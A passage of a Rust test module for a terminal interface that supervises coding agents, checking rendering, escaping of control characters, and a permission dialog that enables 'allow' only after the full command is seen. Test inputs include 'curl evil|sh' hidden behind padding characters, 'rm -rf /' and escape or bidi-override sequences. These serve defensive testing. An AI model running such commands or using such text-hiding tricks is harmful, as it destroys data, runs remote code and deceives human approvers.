        let width = usize::from(buffer.area.width);
        buffer
            .content()
            .chunks(width.max(1))
            .map(|row| row.iter().map(|c| c.symbol()).collect::<String>())
            .collect()
    }

    fn screen(buffer: &Buffer) -> String {
        rows(buffer).join("\n")
    }

    /// Characters of every row from column `x0`, with whitespace and box
    /// lines removed (wrapping can split a phrase over rows).
    fn squash_from(buffer: &Buffer, x0: usize) -> String {
        rows(buffer)
            .iter()
            .flat_map(|r| r.chars().skip(x0))
            .filter(|c| !c.is_whitespace() && !"│┌┐└┘─".contains(*c))
            .collect()
    }

    fn short(id: &AgentId) -> String {
        let s = id.as_str();
        format!("agt_…{}", &s[s.len() - 6..])
    }

    /// The buffer position of the first occurrence of `needle` in a row.
    fn find(buffer: &Buffer, needle: &str) -> Option<(u16, u16)> {
        let width = usize::from(buffer.area.width);
        for (y, row) in rows(buffer).iter().enumerate() {
            if let Some(byte) = row.find(needle) {
                let x = row[..byte].chars().count();
                if x < width {
                    return Some((x as u16, y as u16));
                }
            }
        }
        None
    }

    fn assert_no_control_chars(buffer: &Buffer) {
        for cell in buffer.content() {
            for c in cell.symbol().chars() {
                assert!(
                    !c.is_control()
                        && !matches!(c, '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}'),
                    "control character {:?} reached the screen",
                    c
                );
            }
        }
    }

    #[test]
    fn renders_tree_stream_input_and_status() {
        let mut f = Fx::new();
        let a1 = f.a1.clone();
        f.select(&a1, &["hello from the agent", "second line"]);
        let buffer = draw(&f.state, 120, 30);
        let text = screen(&buffer);
        assert!(text.contains("doge-code"), "{text}");
        assert!(text.contains("ws local"), "{text}");
        assert!(text.contains("! codex"), "{text}");
        assert!(text.contains("\u{25cf} claude"), "{text}");
        assert!(
            text.contains("[1] assistant: hello from the agent"),
            "{text}"
        );
        assert!(text.contains("second line"), "{text}");
        assert!(
            text.contains(&short(&a1.id)),
            "stream title shows the short id\n{text}"
        );
        assert!(text.contains("running"), "{text}");
        assert!(text.contains("queue"), "send mode: {text}");
        assert!(
            text.contains("steer") && text.contains("interrupt"),
            "{text}"
        );
        assert!(text.contains("waiting permission"), "{text}");
        assert!(text.contains("1 waiting permission"), "{text}");
        assert!(text.contains("2 agents"), "{text}");
        assert!(text.contains("daemon ok"), "{text}");
    }

    #[test]
    fn tree_shows_state_symbols_and_auto_tag() {
        let mut f = Fx::new();
        let mut states = [
            (AgentState::Starting, '\u{25cf}'),
            (AgentState::Idle, '\u{25cb}'),
            (AgentState::Stopped, '\u{25a0}'),
            (AgentState::Failed, '\u{2717}'),
        ]
        .map(|(s, c)| {
            (
                s,
                c,
                agent(
                    &f.workspace.id,
                    "x",
                    ProviderKind::Claude,
                    s,
                    "2026-01-01T00:00:09Z",
                ),
            )
        });
        states[0].2.auto_approve = true;
        let agents: Vec<Agent> = states.iter().map(|(_, _, a)| a.clone()).collect();
        update(
            &mut f.state,
            AppEvent::Snapshot {
                projects: vec![f.project.clone()],
                workspaces: vec![f.workspace.clone()],
                agents,
                permissions: Vec::new(),
            },
        );
        let text = screen(&draw(&f.state, 120, 30));
        for (state, symbol, _) in &states {
            assert!(
                text.contains(&format!("{symbol} claude")),
                "{state:?} should show {symbol}\n{text}"
            );
        }
        assert!(text.contains("claude x [auto]"), "auto-approve tag\n{text}");
        assert_eq!(text.matches("[auto]").count(), 1, "{text}");
    }

    #[test]
    fn tree_nests_children_and_marks_mcp() {
        let mut f = Fx::new();
        f.a1.title = "parent".to_owned();
        f.a1.mcp = true;
        let mut child = agent(
            &f.workspace.id,
            "child\n\u{202e}",
            ProviderKind::Claude,
            AgentState::Idle,
            "2026-01-01T00:00:04Z",
        );
        child.parent_id = Some(f.a1.id.clone());
        child.depth = 1;
        let mut grandchild = agent(
            &f.workspace.id,
            "grandchild",
            ProviderKind::Claude,
            AgentState::Idle,
            "2026-01-01T00:00:05Z",
        );
        grandchild.parent_id = Some(child.id.clone());
        grandchild.depth = 2;
        let mut orphan = agent(
            &f.workspace.id,
            "orphan",
            ProviderKind::Claude,
            AgentState::Idle,
            "2026-01-01T00:00:06Z",
        );
        let missing_parent = AgentId::generate();
        orphan.parent_id = Some(missing_parent.clone());
        orphan.depth = 1;
        orphan.mcp = true;
        update(
            &mut f.state,
            AppEvent::Snapshot {
                projects: vec![f.project.clone()],
                workspaces: vec![f.workspace.clone()],
                agents: vec![orphan, grandchild, f.a2, child, f.a1],
                permissions: Vec::new(),
            },
        );
        let buffer = draw(&f.state, 120, 30);
        let parent = find(&buffer, "● claude parent [mcp]").expect("parent has the MCP mark");
        let child = find(&buffer, r"○ claude child\n\u{202e}").expect("escaped child");
        let grandchild = find(&buffer, "○ claude grandchild").expect("grandchild");
        assert_eq!(child, (parent.0 + 2, parent.1 + 1));
        assert_eq!(grandchild, (child.0 + 2, child.1 + 1));
        assert_eq!(
            find(&buffer, "! codex review"),
            Some((parent.0, grandchild.1 + 1))
        );
        let short = short(&missing_parent);
        let note = format!("↳ parent {}", short.trim_start_matches(AgentId::PREFIX));
        assert_eq!(
            find(&buffer, &note).expect("orphan note").1,
            grandchild.1 + 2
        );
        assert_eq!(screen(&buffer).matches("[mcp]").count(), 2);
        assert_no_control_chars(&buffer);
        let wide = draw(&f.state, 136, 30);
        assert!(find(&wide, &format!("↳ parent {short}")).is_some());

        let narrow = draw(&f.state, 60, 15);
        assert!(find(&narrow, "[mcp]").is_some(), "{}", screen(&narrow));
        assert_no_control_chars(&narrow);
    }

    #[test]
    fn renders_permission_dialog() {
        let mut f = Fx::new();
        let a2 = f.a2.clone();
        f.select(&a2, &["waiting"]);
        let permission = f.state.permissions[0].clone();
        f.state.open_dialog(Dialog::permission(permission));
        let buffer = draw(&f.state, 120, 30);
        let text = screen(&buffer);
        assert!(text.contains("Permission"), "{text}");
        assert!(text.contains("rm -rf target"), "{text}");
        assert!(text.contains("command"), "{text}");
        assert!(text.contains("[a]llow"), "{text}");
        assert!(text.contains("[s]ession"), "{text}");
        assert!(text.contains("[d]eny"), "{text}");
        assert!(text.contains(&short(&a2.id)), "{text}");
    }

    #[test]
    fn profile_selection_fills_form_and_warns_on_auto_approve() {
        let mut f = Fx::new();
        press_key(&mut f.state, Key::Down); // workspace
        let effects = press(&mut f.state, 'n');
        let request = effects
            .into_iter()
            .find_map(|effect| match effect {
                Effect::Call {
                    request,
                    method: "profile.list",
                    ..
                } => Some(request),
                _ => None,
            })
            .expect("opening the form fetches profiles");
        update(
            &mut f.state,
            AppEvent::RpcDone {
                request,
                result: Ok(serde_json::json!({"profiles": [
                    {"name": "z-read", "provider": "claude", "model": null,
                     "mode": null, "notes": null, "auto_approve": false},
                    {"name": "a-fast", "provider": "codex", "model": "gpt-5",
                     "mode": "full-access", "notes": null, "auto_approve": true, "mcp": true}
                ]})),
            },
        );
        press_key(&mut f.state, Key::Down); // profile
        update(&mut f.state, AppEvent::Paste("\tfull-access\n".to_owned()));
        let buffer = draw(&f.state, 120, 30);
        assert!(find(&buffer, "(none)").is_some());
        assert!(find(&buffer, "WARNING").is_none());
        press_key(&mut f.state, Key::BackTab); // wrap to last
        assert!(find(&draw(&f.state, 120, 30), "z-read").is_some());
        press_key(&mut f.state, Key::Tab); // wrap to none
        press_key(&mut f.state, Key::Tab); // first in sorted order
        let buffer = draw(&f.state, 120, 30);
        for text in ["a-fast [mcp]", "gpt-5", "full-access"] {
            assert!(find(&buffer, text).is_some(), "{}", screen(&buffer));
        }
        let (x, y) = find(&buffer, "WARNING").expect("warning on selecting auto-approve");
        assert_eq!(buffer[(x, y)].fg, Color::Red);

        // Clearing the inherited mode must send the provider's ordinary default.
        for _ in 0..3 {
            press_key(&mut f.state, Key::Down);
        }
        press_key(&mut f.state, Key::End);
        for _ in "full-access".chars() {
            press_key(&mut f.state, Key::Backspace);
        }
        assert!(find(&draw(&f.state, 120, 30), "WARNING").is_none());
        press_key(&mut f.state, Key::Down);
        press_key(&mut f.state, Key::Down);
        press(&mut f.state, 'x');
        let effects = press_key(&mut f.state, Key::Enter);
        let [
            Effect::Call {
                method: "agent.create",
                params,
                ..
            },
        ] = effects.as_slice()
        else {
            panic!("expected agent.create: {effects:?}");
        };
        assert_eq!(params["provider"], "codex");
        assert_eq!(params["model"], "gpt-5");
        assert!(params["profile"].is_null() && params["mode"].is_null());
        assert_eq!(params["mcp"], true);
    }

    #[test]
    fn renders_auto_approve_warning_in_create_dialog() {
        let mut f = Fx::new();
        let mut form = NewAgentForm::new(f.workspace.id.clone());
        f.state.open_dialog(Dialog::NewAgent(form.clone()));
        let calm = draw(&f.state, 120, 30);
        assert!(find(&calm, "WARNING").is_none(), "{}", screen(&calm));

        form.mode.set_text("bypassPermissions");
        f.state.open_dialog(Dialog::NewAgent(form));
        let buffer = draw(&f.state, 120, 30);
        let (x, y) =
            find(&buffer, "WARNING").unwrap_or_else(|| panic!("no warning\n{}", screen(&buffer)));
        let cell = &buffer[(x, y)];
        assert_eq!(cell.fg, Color::Red, "warning is red");
        let text = screen(&buffer);
        assert!(text.contains("New agent"), "{text}");
        assert!(text.contains("bypassPermissions"), "{text}");
    }

    #[test]
    fn create_workspace_and_archive_dialogs_render() {
        let mut f = Fx::new();
        let mut form = NewWorkspaceForm::new(f.project.id.clone());
        form.toggle_isolation();
        form.branch.set_text("fix-x");
        form.error = Some("branch exists".to_owned());
        f.state.open_dialog(Dialog::NewWorkspace(form));
        let text = screen(&draw(&f.state, 120, 30));
        assert!(text.contains("New workspace"), "{text}");
        assert!(text.contains("fix-x"), "{text}");
        assert!(text.contains("branch exists"), "{text}");

        f.state.open_dialog(Dialog::ConfirmArchive {
            agent_id: f.a1.id.clone(),
            title: "fix tests".to_owned(),
        });
        let text = screen(&draw(&f.state, 120, 30));
        assert!(text.contains("Archive"), "{text}");
        assert!(text.contains("fix tests"), "{text}");
        assert!(text.contains("[y]es"), "{text}");
    }

    #[test]
    fn narrow_terminal_does_not_panic() {
        let mut f = Fx::new();
        let a2 = f.a2.clone();
        f.select(&a2, &["a fairly long line of agent output that must wrap"]);
        f.state.status.error = Some("something failed".to_owned());
        let permission = f.state.permissions[0].clone();
        for (w, h) in [
            (60, 15),
            (20, 5),
            (49, 10),
            (50, 10),
            (1, 1),
            (3, 2),
            (0, 0),
            (200, 3),
        ] {
            f.state.dialog = None;
            f.state.focus = Focus::Tree;
            let _ = draw(&f.state, w, h);
            f.state.focus = Focus::Input;
            f.state.input.set_text("typing something long here");
            f.state.input_target = Some(a2.id.clone());
            let _ = draw(&f.state, w, h);
            f.state.open_dialog(Dialog::permission(permission.clone()));
            let _ = draw(&f.state, w, h);
            f.state
                .open_dialog(Dialog::NewAgent(NewAgentForm::new(f.workspace.id.clone())));
            let _ = draw(&f.state, w, h);
            f.state
                .open_dialog(Dialog::NewWorkspace(NewWorkspaceForm::new(
                    f.project.id.clone(),
                )));
            let _ = draw(&f.state, w, h);
            f.state.open_dialog(Dialog::ConfirmArchive {
                agent_id: a2.id.clone(),
                title: "t".to_owned(),
            });
            let _ = draw(&f.state, w, h);
        }
        // At 60 columns the tree shrinks to 16 columns and names are cut.
        f.state.dialog = None;
        f.state.focus = Focus::Tree;
        let text = screen(&draw(&f.state, 60, 15));
        assert!(text.contains("doge-code"), "{text}");
        assert!(text.contains("assistant"), "{text}");
    }

    #[test]
    fn long_agent_names_are_cut_in_a_narrow_tree() {
        let mut f = Fx::new();
        let mut a = f.a1.clone();
        a.title = "a-very-long-agent-title-indeed".to_owned();
        a.auto_approve = true;
        update(
            &mut f.state,
            AppEvent::Snapshot {
                projects: vec![f.project.clone()],
                workspaces: vec![f.workspace.clone()],
                agents: vec![a],
                permissions: Vec::new(),
            },
        );
        let buffer = draw(&f.state, 40, 12);
        let text = screen(&buffer);
        assert!(
            text.contains('\u{2026}'),
            "cut name shows an ellipsis\n{text}"
        );
        assert!(text.contains("[auto]"), "the tag survives the cut\n{text}");
        assert!(!text.contains("indeed"), "{text}");
    }

    #[test]
    fn control_characters_are_escaped_in_stream() {
        let mut f = Fx::new();
        let mut a = f.a1.clone();
        a.title = "evil\u{1b}[2Jtitle\u{202e}".to_owned();
        update(
            &mut f.state,
            AppEvent::Snapshot {
                projects: vec![f.project.clone()],
                workspaces: vec![f.workspace.clone()],
                agents: vec![a.clone()],
                permissions: Vec::new(),
            },
        );
        f.select(
            &a,
            &["red \u{1b}[31mtext\u{1b}]0;owned\u{7}\r\u{202e}reversed\u{85}"],
        );
        f.state.status.error = None;
        let buffer = draw(&f.state, 120, 30);
        assert_no_control_chars(&buffer);
        let text = screen(&buffer);
        assert!(text.contains("\\x1b[31mtext"), "{text}");
        assert!(text.contains("\\r"), "{text}");
        assert!(text.contains("\\u{202e}reversed"), "{text}");
        assert!(
            text.contains("evil\\x1b[2Jtitle\\u{202e}"),
            "title escaped in header and tree\n{text}"
        );
    }

    #[test]
    fn long_history_renders_tail() {
        let mut f = Fx::new();
        let a1 = f.a1.clone();
        let lines: Vec<String> = (0..2 * STREAM_CAP)
            .map(|i| format!("line number {i}"))
            .collect();
        let refs: Vec<&str> = lines.iter().map(String::as_str).collect();
        f.select(&a1, &refs);
        let started = std::time::Instant::now();
        let text = screen(&draw(&f.state, 120, 30));
        assert!(started.elapsed() < std::time::Duration::from_secs(1));
        assert!(
            text.contains(&format!("line number {}", 2 * STREAM_CAP - 1)),
            "{text}"
        );
        assert!(!text.contains("line number 0\n") && !text.contains("] assistant: line number 0 "));
        // Scrolled up, the tail is no longer the last row.
        f.state.stream.scroll_up(10);
        let text = screen(&draw(&f.state, 120, 30));
        assert!(
            !text.contains(&format!("line number {}", 2 * STREAM_CAP - 1)),
            "{text}"
        );
        assert!(
            text.contains(&format!("line number {}", 2 * STREAM_CAP - 11)),
            "{text}"
        );
    }

    #[test]
    fn long_lines_wrap_and_stay_visible() {
        let mut f = Fx::new();
        let a1 = f.a1.clone();
        let long = format!("{} END_OF_LINE", "word ".repeat(60));
        f.select(&a1, &[&long]);
        let text = screen(&draw(&f.state, 80, 20));
        assert!(text.contains("END_OF_LINE"), "{text}");
    }

    fn press_key(state: &mut AppState, key: Key) -> Vec<Effect> {
        update(state, AppEvent::Key(KeyInput::new(key)))
    }

    fn press(state: &mut AppState, c: char) -> Vec<Effect> {
        update(state, AppEvent::Key(KeyInput::char(c)))
    }

    fn resize(state: &mut AppState, width: u16, height: u16) {
        update(state, AppEvent::Resize { width, height });
    }

    fn responds(effects: &[Effect]) -> bool {
        effects.iter().any(|e| {
            matches!(
                e,
                Effect::Call {
                    request: RequestTag::Respond { .. },
                    ..
                }
            )
        })
    }

    /// Show `summary` as a permission of a2 (not the stream's agent) in a
    /// `width` x `height` terminal, with its keys armed.
    fn open_permission(f: &mut Fx, width: u16, height: u16, summary: &str) {
        resize(&mut f.state, width, height);
        let a1 = f.a1.clone();
        f.select(&a1, &["unrelated"]);
        let permission = permission(&f.a2.id, summary);
        f.state.permissions = vec![permission.clone()];
        f.state.open_dialog(Dialog::permission(permission));
        for _ in 0..PERMISSION_ARM_TICKS {
            update(&mut f.state, AppEvent::Tick);
        }
        assert!(f.state.dialog.as_ref().expect("dialog").permission_armed());
    }

    fn numbered_rows(n: usize) -> String {
        (0..n)
            .map(|i| format!("row{i}"))
            .collect::<Vec<_>>()
            .join("\n")
    }

    /// PgDn until the dialog stops moving (reads the summary to its end).
    fn read_to_the_end(state: &mut AppState) {
        for _ in 0..200 {
            press_key(state, Key::PageDown);
        }
    }

    #[test]
    fn permission_dialog_shows_agent_and_full_summary_escaped() {
        let mut f = Fx::new();
        let a2 = f.a2.clone();
        let summary = format!(
            "rm -rf /tmp/x\r\u{1b}[2J\u{202e}evil\nsecond line {}",
            "A".repeat(5000)
        );
        open_permission(&mut f, 120, 30, &summary);
        let buffer = draw(&f.state, 120, 30);
        assert_no_control_chars(&buffer);
        let text = screen(&buffer);
        assert!(text.contains(&short(&a2.id)), "agent short id\n{text}");
        assert!(text.contains("codex"), "provider\n{text}");
        assert!(text.contains("review"), "agent title\n{text}");
        assert!(text.contains("command"), "kind\n{text}");
        assert!(text.contains("not the selected agent"), "{text}");
        let right = squash_from(&buffer, 36);
        assert!(
            right.contains("rm-rf/tmp/x\\r\\x1b[2J\\u{202e}evil"),
            "escaped: {right}"
        );
        assert!(
            right.contains("secondline"),
            "newline kept as a line break: {right}"
        );
        // The protocol cut the text; the end is reached by scrolling.
        read_to_the_end(&mut f.state);
        let buffer = draw(&f.state, 120, 30);
        let right = squash_from(&buffer, 36);
        assert!(right.contains("…(truncated,"), "marker: {right}");
        assert!(right.contains("bytestotal)"), "{right}");
        // A summary that fits is shown entirely, without a scroll indicator.
        open_permission(&mut f, 120, 40, &numbered_rows(12));
        let right = squash_from(&draw(&f.state, 120, 40), 36);
        assert!(right.contains("row0"), "{right}");
        assert!(right.contains("row11"), "{right}");
        assert!(!right.contains("scrolltotheend"), "{right}");
    }

    #[test]
    fn allow_and_session_need_the_whole_summary_read_but_deny_always_works() {
        let mut f = Fx::new();
        open_permission(&mut f, 120, 30, &numbered_rows(100));
        for key in ['a', 's'] {
            let fx = press(&mut f.state, key);
            assert!(!responds(&fx), "{key} answered an unread request: {fx:?}");
        }
        assert!(f.state.dialog.is_some(), "still open");
        // Scrolling down to the end enables them.
        read_to_the_end(&mut f.state);
        let right = squash_from(&draw(&f.state, 120, 30), 36);
        assert!(right.contains("row99"), "{right}");
        let fx = press(&mut f.state, 'a');
        assert!(responds(&fx), "a after reading to the end: {fx:?}");

        let mut f = Fx::new();
        open_permission(&mut f, 120, 30, &numbered_rows(100));
        let fx = press(&mut f.state, 'd');
        assert!(responds(&fx), "deny works without reading: {fx:?}");

        let mut f = Fx::new();
        open_permission(&mut f, 120, 30, &numbered_rows(100));
        read_to_the_end(&mut f.state);
        let fx = press(&mut f.state, 's');
        assert!(responds(&fx), "s after reading to the end: {fx:?}");
    }

    #[test]
    fn jumping_to_the_end_does_not_count_as_reading_the_middle() {
        let mut f = Fx::new();
        open_permission(&mut f, 120, 30, &numbered_rows(100));
        press_key(&mut f.state, Key::End);
        let right = squash_from(&draw(&f.state, 120, 30), 36);
        assert!(right.contains("row99"), "End shows the tail: {right}");
        let fx = press(&mut f.state, 'a');
        assert!(!responds(&fx), "the middle was never visible: {fx:?}");
        // Reading on from the top does.
        press_key(&mut f.state, Key::Home);
        read_to_the_end(&mut f.state);
        assert!(responds(&press(&mut f.state, 'a')));
    }

    #[test]
    fn resize_that_fits_the_summary_enables_allow() {
        let mut f = Fx::new();
        open_permission(&mut f, 120, 20, &numbered_rows(30));
        assert!(!responds(&press(&mut f.state, 'a')));
        resize(&mut f.state, 120, 60);
        let right = squash_from(&draw(&f.state, 120, 60), 36);
        assert!(right.contains("row29"), "everything fits: {right}");
        assert!(
            !responds(&press(&mut f.state, 'a')),
            "a resize re-arms the dialog"
        );
        for _ in 0..PERMISSION_ARM_TICKS {
            update(&mut f.state, AppEvent::Tick);
        }
        assert!(responds(&press(&mut f.state, 'a')));
    }

    #[test]
    fn growing_the_terminal_rearms_the_permission_dialog() {
        // Read or not, rows shown only at a size not yet drawn must not let
        // a key typed before the resize answer.
        for read in [false, true] {
            let mut f = Fx::new();
            open_permission(&mut f, 120, 20, &numbered_rows(30));
            if read {
                read_to_the_end(&mut f.state);
            }
            let (effects, mut sent) = tokio::sync::mpsc::unbounded_channel();
            let terminal = ratatui::Terminal::new(TestBackend::new(120, 20)).expect("terminal");
            let mut runtime = crate::tui::Runtime::new(terminal, effects, update);
            *runtime.state_mut() = std::mem::take(&mut f.state);
            runtime.terminal_mut().backend_mut().resize(120, 60);
            runtime
                .handle(AppEvent::Key(KeyInput::char('a')))
                .expect("handle");
            let mut answered = Vec::new();
            while let Ok(effect) = sent.try_recv() {
                answered.push(effect);
            }
            assert!(!responds(&answered), "read={read}: {answered:?}");
            assert_eq!(runtime.state().size, (120, 60));
            for _ in 0..PERMISSION_ARM_TICKS {
                runtime.handle(AppEvent::Tick).expect("tick");
            }
            runtime
                .handle(AppEvent::Key(KeyInput::char('a')))
                .expect("handle");
            let mut answered = Vec::new();
            while let Ok(effect) = sent.try_recv() {
                answered.push(effect);
            }
            assert!(responds(&answered), "read={read}: armed again {answered:?}");
        }
    }

    #[test]
    fn resize_that_hides_rows_again_disables_allow() {
        let mut f = Fx::new();
        open_permission(&mut f, 120, 60, &numbered_rows(30));
        resize(&mut f.state, 120, 20);
        assert!(!responds(&press(&mut f.state, 'a')));
    }

    #[test]
    fn scroll_indicator_is_rendered_and_a_s_are_dimmed_until_the_end() {
        let mut f = Fx::new();
        open_permission(&mut f, 120, 30, &numbered_rows(100));
        let buffer = draw(&f.state, 120, 30);
        let text = screen(&buffer);
        assert!(text.contains("rows 1\u{2013}"), "{text}");
        assert!(text.contains(" of 100 "), "{text}");
        assert!(
            squash_from(&buffer, 36).contains("scrolltotheendtoenable[a]/[s]"),
            "{text}"
        );
        let (x, y) = find(&buffer, "[a]llow").expect("legend");
        assert!(buffer[(x, y)].modifier.contains(Modifier::DIM));
        let (x, y) = find(&buffer, "[d]eny").expect("legend");
        assert!(!buffer[(x, y)].modifier.contains(Modifier::DIM));
        // Scrolling moves the window and the numbers.
        press_key(&mut f.state, Key::Down);
        let text = screen(&draw(&f.state, 120, 30));
        assert!(text.contains("rows 2\u{2013}"), "{text}");
        read_to_the_end(&mut f.state);
        let buffer = draw(&f.state, 120, 30);
        let text = screen(&buffer);
        assert!(text.contains("\u{2013}100 of 100"), "{text}");
        assert!(
            !squash_from(&buffer, 36).contains("toenable[a]/[s]"),
            "{text}"
        );
        let (x, y) = find(&buffer, "[a]llow").expect("legend");
        assert!(!buffer[(x, y)].modifier.contains(Modifier::DIM));
    }

    #[test]
    fn long_agent_title_keeps_summary_and_legend_visible() {
        let mut f = Fx::new();
        f.a2.title = "T".repeat(3000);
        update(
            &mut f.state,
            AppEvent::Snapshot {
                projects: vec![f.project.clone()],
                workspaces: vec![f.workspace.clone()],
                agents: vec![f.a1.clone(), f.a2.clone()],
                permissions: Vec::new(),
            },
        );
        open_permission(&mut f, 120, 30, "rm -rf target");
        let text = screen(&draw(&f.state, 120, 30));
        assert!(text.contains("rm -rf target"), "{text}");
        assert!(text.contains("[d]eny"), "{text}");
        assert!(text.contains("kind: command"), "{text}");
        assert!(text.contains("codex"), "provider survives the cut\n{text}");
        assert!(responds(&press(&mut f.state, 'a')));
    }

    #[test]
    fn tiny_window_keeps_the_footer_and_refuses_allow() {
        let mut f = Fx::new();
        open_permission(&mut f, 40, 8, "rm -rf target");
        let text = screen(&draw(&f.state, 40, 8));
        assert!(text.contains("window too small"), "{text}");
        assert!(text.contains("[d]eny"), "{text}");
        assert!(!responds(&press(&mut f.state, 'a')), "{text}");
        assert!(!responds(&press(&mut f.state, 's')));
        assert!(responds(&press(&mut f.state, 'd')));
        // The "keys enabled shortly" hint is still there before arming.
        let mut f = Fx::new();
        resize(&mut f.state, 40, 8);
        let permission = permission(&f.a2.id, "rm -rf target");
        f.state.permissions = vec![permission.clone()];
        f.state.open_dialog(Dialog::permission(permission));
        let text = screen(&draw(&f.state, 40, 8));
        assert!(text.contains("keys enabled shortly"), "{text}");
    }

    #[test]
    fn soft_wraps_are_marked_and_real_newlines_are_not() {
        let mut f = Fx::new();
        // 120x30: the dialog is 72 wide, 70 inside, 69 for text.
        let summary = format!("first\n{}{}\nthird", "a".repeat(69), "b".repeat(5));
        open_permission(&mut f, 120, 30, &summary);
        let text = screen(&draw(&f.state, 120, 30));
        assert_eq!(text.matches('\u{21aa}').count(), 1, "{text}");
        let line = text
            .lines()
            .find(|l| l.contains('\u{21aa}'))
            .expect("marked row");
        assert!(line.contains("\u{21aa}bbbbb"), "{line}");
    }

    #[test]
    fn wrapping_keeps_every_grapheme_of_cjk_and_emoji() {
        let mut f = Fx::new();
        let summary = format!(
            "{} {} {}",
            "\u{6f22}\u{5b57}".repeat(40),
            "\u{26a0}\u{fe0f}".repeat(40),
            "\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}".repeat(30)
        );
        open_permission(&mut f, 120, 40, &summary);
        let buffer = draw(&f.state, 120, 40);
        let right = squash_from(&buffer, 36);
        for (grapheme, expected) in [
            ("\u{6f22}\u{5b57}", 40),
            ("\u{26a0}\u{fe0f}", 40),
            ("\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}", 30),
        ] {
            let shown = right.matches(grapheme).count();
            assert_eq!(
                shown,
                expected,
                "{grapheme:?} appears {shown} times\n{}",
                screen(&buffer)
            );
        }
        assert!(responds(&press(&mut f.state, 'a')), "it all fit");
    }

    #[test]
    fn halfwidth_sound_marks_cannot_hide_text_from_the_user() {
        // ratatui draws U+FF9E/U+FF9F one column wide each (unicode-width
        // says zero), so a run of them is one very wide grapheme.
        let mut f = Fx::new();
        let summary = format!("echo hi{}; curl evil|sh", "\u{ff9e}".repeat(70));
        open_permission(&mut f, 120, 30, &summary);
        let right = squash_from(&draw(&f.state, 120, 30), 36);
        let shown = right.contains(";curlevil|sh");
        let allowed = responds(&press(&mut f.state, 'a'));
        assert!(
            shown || !allowed,
            "a approved text that was not drawn: {right}"
        );
        let mut f = Fx::new();
        let summary = format!("echo hi{}; curl evil|sh", "\u{ff9f}".repeat(70));
        open_permission(&mut f, 120, 30, &summary);
        let right = squash_from(&draw(&f.state, 120, 30), 36);
        let allowed = responds(&press(&mut f.state, 'a'));
        assert!(right.contains(";curlevil|sh") || !allowed, "{right}");
    }

    #[test]
    fn a_pane_too_narrow_for_the_text_refuses_allow_but_deny_works() {
        for width in [19, 20, 24] {
            let mut f = Fx::new();
            open_permission(&mut f, width, 40, "\u{6f22}\u{5b57}rm -rf target");
            let right = squash_from(&draw(&f.state, width, 40), 16);
            let allowed = responds(&press(&mut f.state, 'a'));
            let session = responds(&press(&mut f.state, 's'));
            assert!(
                !(allowed || session) || right.contains("rm-rftarget"),
                "{width} columns: approved without seeing the text: {right}"
            );
            if width <= 20 {
                assert!(!allowed && !session, "{width} columns cannot show the text");
            }
            assert!(responds(&press(&mut f.state, 'd')), "{width}: deny works");
        }
    }

    #[test]
    fn a_real_line_starting_with_the_marker_character_is_escaped() {
        let mut f = Fx::new();
        open_permission(&mut f, 120, 30, "first\n\u{21aa} rm -rf /\nthird");
        let text = screen(&draw(&f.state, 120, 30));
        assert_eq!(text.matches('\u{21aa}').count(), 0, "{text}");
        assert!(text.contains("\\u{21aa} rm -rf /"), "{text}");
    }

    #[test]
    fn shortened_request_is_flagged_in_red_and_allowed_after_reading() {
        let mut f = Fx::new();
        let summary = format!("echo {}", "word ".repeat(1500));
        open_permission(&mut f, 120, 30, &summary);
        let buffer = draw(&f.state, 120, 30);
        let (x, y) = find(&buffer, "this request was shortened by dgc").unwrap_or_else(|| {
            panic!("no warning\n{}", screen(&buffer));
        });
        assert_eq!(buffer[(x, y)].fg, Color::Red);
        assert!(screen(&buffer).contains("the full command is not shown"));
        assert!(!responds(&press(&mut f.state, 'a')), "unread");
        read_to_the_end(&mut f.state);
        assert!(
            responds(&press(&mut f.state, 'a')),
            "a stays available once read"
        );
        // An untruncated request carries no warning.
        let mut f = Fx::new();
        open_permission(&mut f, 120, 30, "rm -rf target");
        assert!(!screen(&draw(&f.state, 120, 30)).contains("shortened"));
    }

    #[test]
    fn unarmed_permission_dialog_shows_hint() {
        let mut f = Fx::new();
        let a2 = f.a2.clone();
        f.select(&a2, &["x"]);
        let permission = f.state.permissions[0].clone();
        f.state.open_dialog(Dialog::permission(permission));
        assert!(!f.state.dialog.as_ref().expect("dialog").permission_armed());
        let buffer = draw(&f.state, 120, 30);
        let text = screen(&buffer);
        assert!(text.contains("keys enabled shortly"), "{text}");
        let (x, y) = find(&buffer, "[a]llow").expect("legend");
        assert!(
            buffer[(x, y)].modifier.contains(Modifier::DIM),
            "legend is dimmed while unarmed"
        );

        for _ in 0..PERMISSION_ARM_TICKS {
            update(&mut f.state, AppEvent::Tick);
        }
        assert!(f.state.dialog.as_ref().expect("dialog").permission_armed());
        let buffer = draw(&f.state, 120, 30);
        let text = screen(&buffer);
        assert!(!text.contains("keys enabled shortly"), "{text}");
        let (x, y) = find(&buffer, "[a]llow").expect("legend");
        assert!(!buffer[(x, y)].modifier.contains(Modifier::DIM));
    }

    #[test]
    fn input_title_names_the_target_and_hides_another_agents_draft() {
        let mut f = Fx::new();
        let a1 = f.a1.clone();
        f.select(&a1, &[]);
        update(&mut f.state, AppEvent::Key(KeyInput::char('i')));
        f.state.input.set_text("for a1 only");
        let text = screen(&draw(&f.state, 120, 30));
        let title = text
            .lines()
            .find(|l| l.contains("send:"))
            .expect("input title");
        assert!(title.contains(&short_id(&a1.id)), "{title}");
        assert!(title.contains(&a1.title), "{title}");

        // In the tree on another agent, a1's draft is not shown there.
        update(&mut f.state, AppEvent::Key(KeyInput::new(Key::Esc)));
        update(&mut f.state, AppEvent::Key(KeyInput::char('j')));
        let text = screen(&draw(&f.state, 120, 30));
        assert!(!text.contains("for a1 only"), "{text}");
        assert!(text.contains("press i to type"), "{text}");
    }

    #[test]
    fn input_shows_permission_hint_and_missing_target() {
        let mut f = Fx::new();
        let a2 = f.a2.clone();
        f.select(&a2, &["x"]);
        update(&mut f.state, AppEvent::Key(KeyInput::char('i')));
        assert_eq!(f.state.focus, Focus::Input);
        f.state.input.set_text("half typed");
        assert_eq!(f.state.permission_hint(), Some(PERMISSION_HINT));
        let text = screen(&draw(&f.state, 120, 30));
        assert!(text.contains(PERMISSION_HINT), "{text}");
        assert!(text.contains("half typed"), "{text}");
        assert!(!text.contains("no target"), "{text}");

        // The agent being typed at goes away (snapshot without it).
        update(
            &mut f.state,
            AppEvent::Snapshot {
                projects: vec![f.project.clone()],
                workspaces: vec![f.workspace.clone()],
                agents: vec![f.a1.clone()],
                permissions: Vec::new(),
            },
        );
